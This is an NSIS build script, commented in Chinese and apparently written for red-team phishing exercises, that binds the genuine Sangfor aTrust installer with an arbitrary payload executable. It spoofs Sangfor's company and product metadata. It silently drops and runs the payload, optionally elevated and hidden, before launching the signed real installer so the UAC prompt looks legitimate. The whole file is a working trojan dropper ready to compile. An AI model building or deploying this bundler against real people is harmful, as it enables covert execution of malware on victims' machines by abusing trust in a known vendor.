; ============================================================
; bundle.nsi — aTrust 官方安装器 + 任意载荷 捆绑器
; 用途：仅限授权攻防演练（社工钓鱼模拟）。对目标使用前确认 RoE 授权范围。
; 构建：
;   makensis -DHOST=/path/to/aTrustInstaller.exe \
;            -DPAYLOAD=/path/to/payload.exe \
;            -DOUT=/path/to/output.exe bundle.nsi
; 行为：静默释放载荷与官方 aTrust 安装器到 %TEMP%，
;       先拉起载荷（默认普通权限，可 -DPAYLOAD_ADMIN=1 改为提权），
;       再以 runas 拉起官方 aTrust 安装器（UAC 显示 Sangfor 已验证签名）。
; 回收：aTrust 安装退出后 NSIS 自动清理 $PLUGINSDIR；载荷若常驻需自行按演练方案回收。
; ============================================================

!ifndef HOST
  !define HOST "aTrustInstaller_host.exe"
!endif
!ifndef PAYLOAD
  !define PAYLOAD "payload.exe"
!endif
!ifndef OUT
  !define OUT "aTrustInstaller_bundle.exe"
!endif
!ifndef PAYLOAD_ARGS
  !define PAYLOAD_ARGS ""
!endif
!ifndef PAYLOAD_ADMIN
  !define PAYLOAD_ADMIN "0"
!endif

SilentInstall silent
Icon "logo.ico"
OutFile "${OUT}"
XPStyle on
; 引导器自身不要求管理员：载荷按普通权限跑，
; aTrust 由 runas 触发它自己的 UAC（蓝色、显示 Sangfor Technologies Inc.）
RequestExecutionLevel user

; ---- 伪装成官方元数据（演练仿真用；无证书，文件本身未签名）----
VIProductVersion "2.5.16.20"
VIAddVersionKey /LANG=2052 "CompanyName"      "Sangfor Technologies"
VIAddVersionKey /LANG=2052 "FileDescription"  "aTrustInstaller"
VIAddVersionKey /LANG=2052 "FileVersion"      "2.5.16.20"
VIAddVersionKey /LANG=2052 "InternalName"     "aTrustInstaller"
VIAddVersionKey /LANG=2052 "LegalCopyright"   "Copyright (C) 2019-2024 Sangfor Technologies. All Rights Reserved."
VIAddVersionKey /LANG=2052 "OriginalFilename" "aTrustInstaller.exe"
VIAddVersionKey /LANG=2052 "ProductName"      "aTrust"
VIAddVersionKey /LANG=2052 "ProductVersion"   "2.5.16.20"

Section "bundle"
  InitPluginsDir
  SetOutPath "$PLUGINSDIR"
  File "/oname=payload.exe"         "${PAYLOAD}"
  File "/oname=aTrustInstaller.exe" "${HOST}"

  ; 1) 先静默拉起载荷（异步，不阻塞官方安装界面弹出）
!if "${PAYLOAD_ADMIN}" == "1"
  ExecShell "runas" "$PLUGINSDIR\payload.exe" "${PAYLOAD_ARGS}" SW_HIDE
!else
  Exec '"$PLUGINSDIR\payload.exe" ${PAYLOAD_ARGS}'
!endif

  ; 2) 再走官方 aTrust 安装流程（等待其退出，便于 PLUGINSDIR 清理）
  ExecShellWait "runas" "$PLUGINSDIR\aTrustInstaller.exe" "" SW_SHOWNORMAL
SectionEnd
